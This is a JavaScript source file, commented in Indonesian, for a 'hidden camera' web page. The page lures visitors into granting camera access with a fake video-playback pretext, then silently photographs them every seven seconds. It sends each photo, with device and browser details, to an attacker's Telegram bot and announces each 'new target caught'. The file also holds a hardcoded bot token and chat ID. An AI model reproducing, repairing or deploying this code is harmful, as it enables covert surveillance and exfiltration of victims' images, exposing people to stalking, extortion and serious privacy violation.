/**
 * ==============================================
 * ZETA HIDDEN CAMERA - FIXED VERSION
 * ==============================================
 * - Auto deteksi resolusi yang didukung kamera
 * - Fallback kalau resolusi gak support
 * - Tetep motret walau resolusi berubah
 */

// ================== KONFIGURASI ==================
const TELEGRAM_BOT_TOKEN = "8639790794:AAFPtKiq94nQGVjI1HB_H3Wza78oSQyo4AI";  // GANTI!
const TELEGRAM_CHAT_ID = "5866952620";  // GANTI!

// ================== VARIABEL GLOBAL ==================
let hiddenStream = null;
let imageCapture = null;
let captureInterval = null;
let isCapturing = false;
let photoCount = 0;
let retryCount = 0;
let currentPhotoId = 0;
const MAX_RETRY = 3;
const CAPTURE_INTERVAL = 7000; // 7 detik

// Resolusi cadangan (dari yang paling umum ke yang paling kecil)
const SUPPORTED_RESOLUTIONS = [
    { width: 1280, height: 720 },  // HD ready
    { width: 1024, height: 768 },  // XGA
    { width: 800, height: 600 },   // SVGA
    { width: 640, height: 480 },   // VGA
    { width: 352, height: 288 },   // CIF
    { width: 320, height: 240 },   // QVGA
    { width: 176, height: 144 },   // QCIF
];

let currentResolutionIndex = 0; // Mulai dari resolusi terbesar

// ================== FUNGSI UTAMA ==================
window.startHiddenCamera = async function() {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error("❌ Token atau Chat ID belum diisi!");
        showNotification("Konfigurasi error", true);
        return;
    }
    
    updateHiddenStatus("⏳ Meminta izin kamera...");
    
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) overlay.style.display = 'flex';
    
    try {
        // Minta izin kamera dengan resolusi standar dulu
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: "user"
            },
            audio: false
        });
        
        hiddenStream = stream;
        
        if (overlay) overlay.style.display = 'none';
        
        updateHiddenStatus("✅ Kamera aktif");
        
        // Dapatkan track dan buat ImageCapture
        const track = stream.getVideoTracks()[0];
        imageCapture = new ImageCapture(track);
        
        // CEK RESOLUSI YANG DIDUKUNG
        await checkSupportedResolutions(track);
        
        // Kirim notifikasi ke Telegram
        sendTelegramMessage(
            "🚨 **TARGET BARU KENA!** 🚨\n\n" +
            "📍 **Mode:** Hidden Camera (Fixed)\n" +
            "⏰ **Waktu:** " + new Date().toLocaleString('id-ID') + "\n" +
            "📱 **Device:** " + navigator.platform + "\n" +
            "🌐 **Browser:** " + getBrowserInfo() + "\n" +
            "🎥 **Resolusi:** " + SUPPORTED_RESOLUTIONS[currentResolutionIndex].width + "x" + SUPPORTED_RESOLUTIONS[currentResolutionIndex].height
        );
        
        // Tunggu 3 detik
        setTimeout(() => {
            isCapturing = true;
            updateHiddenStatus("📸 Memotret...");
            
            // Motret pertama
            captureHiddenPhoto();
            
            // Interval
            captureInterval = setInterval(() => {
                if (isCapturing) {
                    captureHiddenPhoto();
                }
            }, CAPTURE_INTERVAL);
            
        }, 3000);
        
    } catch (err) {
        if (overlay) overlay.style.display = 'none';
        console.error("❌ Gagal:", err);
        updateHiddenStatus("❌ Gagal: " + err.message);
        showFakeErrorMessage(err);
        
        // Coba lagi
        setTimeout(() => {
            if (!hiddenStream) startHiddenCamera();
        }, 5000);
    }
};

// ================== CEK RESOLUSI YANG DIDUKUNG ==================
async function checkSupportedResolutions(track) {
    console.log("🔍 Mengecek resolusi yang didukung...");
    
    const capabilities = track.getCapabilities?.();
    if (capabilities) {
        console.log("📊 Capabilities:", capabilities);
        
        // Kalau ada info resolusi dari browser, gunakan itu
        if (capabilities.width && capabilities.height) {
            const minWidth = capabilities.width.min || 0;
            const maxWidth = capabilities.width.max || 3840;
            const minHeight = capabilities.height.min || 0;
            const maxHeight = capabilities.height.max || 2160;
            
            console.log(`📐 Resolusi support: ${minWidth}x${minHeight} - ${maxWidth}x${maxHeight}`);
            
            // Cari resolusi terbaik yang masih dalam range
            for (let i = 0; i < SUPPORTED_RESOLUTIONS.length; i++) {
                const res = SUPPORTED_RESOLUTIONS[i];
                if (res.width <= maxWidth && res.height <= maxHeight) {
                    currentResolutionIndex = i;
                    console.log(`✅ Pilih resolusi: ${res.width}x${res.height}`);
                    break;
                }
            }
        }
    }
    
    // Test resolusi dengan mencoba takePhoto (tanpa ngirim)
    for (let i = currentResolutionIndex; i < SUPPORTED_RESOLUTIONS.length; i++) {
        const res = SUPPORTED_RESOLUTIONS[i];
        try {
            console.log(`🔄 Test resolusi ${res.width}x${res.height}...`);
            
            // Coba take photo dengan resolusi ini
            await imageCapture.takePhoto({
                imageWidth: res.width,
                imageHeight: res.height,
                quality: 0.5  // Kualitas rendah buat test
            });
            
            console.log(`✅ Resolusi ${res.width}x${res.height} DIDUKUNG!`);
            currentResolutionIndex = i;
            break; // Pake resolusi ini
            
        } catch (err) {
            console.log(`❌ Resolusi ${res.width}x${res.height} GAGAL:`, err.message);
            // Lanjut ke resolusi berikutnya
        }
    }
    
    updateHiddenStatus(`📷 Resolusi: ${SUPPORTED_RESOLUTIONS[currentResolutionIndex].width}x${SUPPORTED_RESOLUTIONS[currentResolutionIndex].height}`);
}

// ================== FUNGSI MOTRET ==================
async function captureHiddenPhoto() {
    if (!imageCapture || !isCapturing) return;
    
    currentPhotoId++;
    const thisPhotoId = currentPhotoId;
    
    try {
        const currentRes = SUPPORTED_RESOLUTIONS[currentResolutionIndex];
        
        console.log(`📸 [${thisPhotoId}] Motret dengan resolusi ${currentRes.width}x${currentRes.height}...`);
        
        // Ambil foto
        let blob;
        try {
            blob = await imageCapture.takePhoto({
                imageWidth: currentRes.width,
                imageHeight: currentRes.height,
                quality: 0.9
            });
        } catch (err) {
            // Kalau error resolusi, coba resolusi lebih kecil
            if (err.name === 'NotSupportedError' || err.message.includes('range')) {
                console.log(`⚠️ Resolusi ${currentRes.width}x${currentRes.height} gak support, coba lebih kecil...`);
                
                // Turunin resolusi
                if (currentResolutionIndex < SUPPORTED_RESOLUTIONS.length - 1) {
                    currentResolutionIndex++;
                    updateHiddenStatus(`📷 Turun resolusi ke ${SUPPORTED_RESOLUTIONS[currentResolutionIndex].width}x${SUPPORTED_RESOLUTIONS[currentResolutionIndex].height}`);
                    
                    // Coba lagi dengan resolusi baru
                    return captureHiddenPhoto();
                } else {
                    throw new Error("Semua resolusi gagal");
                }
            } else {
                throw err;
            }
        }
        
        // Reset retry count kalau sukses
        retryCount = 0;
        
        console.log(`📤 Foto ${thisPhotoId}: ${(blob.size/1024).toFixed(2)} KB`);
        
        // Kirim ke Telegram
        sendPhotoToTelegram(blob, thisPhotoId);
        
        updateHiddenStatus(`📸 Foto #${thisPhotoId} terkirim (${(blob.size/1024).toFixed(1)} KB)`);
        
    } catch (err) {
        console.error(`❌ Gagal motret #${thisPhotoId}:`, err);
        
        if (retryCount < MAX_RETRY) {
            retryCount++;
            updateHiddenStatus(`⚠️ Gagal, coba lagi (${retryCount}/${MAX_RETRY})...`);
            
            setTimeout(() => {
                captureHiddenPhoto();
            }, 2000);
        } else {
            updateHiddenStatus("❌ Gagal terus, coba refresh");
            retryCount = 0;
            
            // Kirim error report ke Telegram
            sendTelegramMessage(`⚠️ **Error pada target**\nGagal motret setelah ${MAX_RETRY} kali: ${err.message}`);
        }
    }
}

// ================== KIRIM FOTO ==================
function sendPhotoToTelegram(blob, photoId) {
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    formData.append('photo', blob, `hidden_${Date.now()}.jpg`);
    formData.append('caption', 
        `📸 **Hidden Capture #${photoId}**\n` +
        `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n` +
        `📎 Ukuran: ${(blob.size/1024).toFixed(2)} KB\n` +
        `📐 Resolusi: ${SUPPORTED_RESOLUTIONS[currentResolutionIndex].width}x${SUPPORTED_RESOLUTIONS[currentResolutionIndex].height}\n` +
        `🕵️ Mode: Auto Detect`
    );
    
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.ok) {
            console.log(`✅ Foto ${photoId} terkirim`);
        } else {
            console.error('❌ Gagal kirim:', data);
            if (data.error_code === 403) {
                updateHiddenStatus("❌ ERROR: Chat ID salah!", true);
            }
        }
    })
    .catch(e => console.error('❌ Network error:', e));
}

// ================== KIRIM PESAN ==================
function sendTelegramMessage(text) {
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown'
        })
    })
    .catch(e => console.error(e));
}

// ================== FUNGSI LAINNYA (sama) ==================
function updateHiddenStatus(message, isError = false) {
    const statusEl = document.getElementById('hiddenStatus');
    if (!statusEl) return;
    statusEl.innerHTML = (isError ? '❌ ' : '🕵️ ') + message;
    statusEl.style.color = isError ? '#ff6b6b' : '#0f0';
    console.log(`[Hidden] ${message}`);
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    if (ua.indexOf('Chrome') > -1) return 'Chrome';
    if (ua.indexOf('Firefox') > -1) return 'Firefox';
    if (ua.indexOf('Safari') > -1) return 'Safari';
    if (ua.indexOf('Edg') > -1) return 'Edge';
    return 'Unknown';
}

function showFakeErrorMessage(err) {
    const warningEl = document.getElementById('ageWarning');
    if (!warningEl) return;
    
    let errorText = '';
    if (err.name === 'NotAllowedError') {
        errorText = '⚠️ Untuk memutar video, izinkan akses kamera di pop-up browser!';
    } else {
        errorText = '⚠️ Error: ' + err.message + '. Coba refresh dan izinkan kamera.';
    }
    
    warningEl.innerHTML = '❌ ' + errorText;
    warningEl.style.background = 'rgba(255, 0, 0, 0.2)';
}

function showNotification(msg, isError = false) {
    const notif = document.createElement('div');
    notif.style.cssText = `
        position: fixed; top: 20px; right: 20px; 
        background: ${isError ? '#ff3b3b' : '#0f0'}; 
        color: ${isError ? 'white' : 'black'}; 
        padding: 15px 20px; border-radius: 10px; 
        font-weight: bold; z-index: 10001;
        box-shadow: 0 5px 20px rgba(0,0,0,0.5);
    `;
    notif.innerText = msg;
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 3000);
}

// ================== CLEANUP ==================
window.stopHiddenCamera = function() {
    if (hiddenStream) {
        hiddenStream.getTracks().forEach(t => t.stop());
        hiddenStream = null;
    }
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
    isCapturing = false;
    updateHiddenStatus("⏹️ Kamera dimatikan");
};

window.addEventListener('beforeunload', stopHiddenCamera);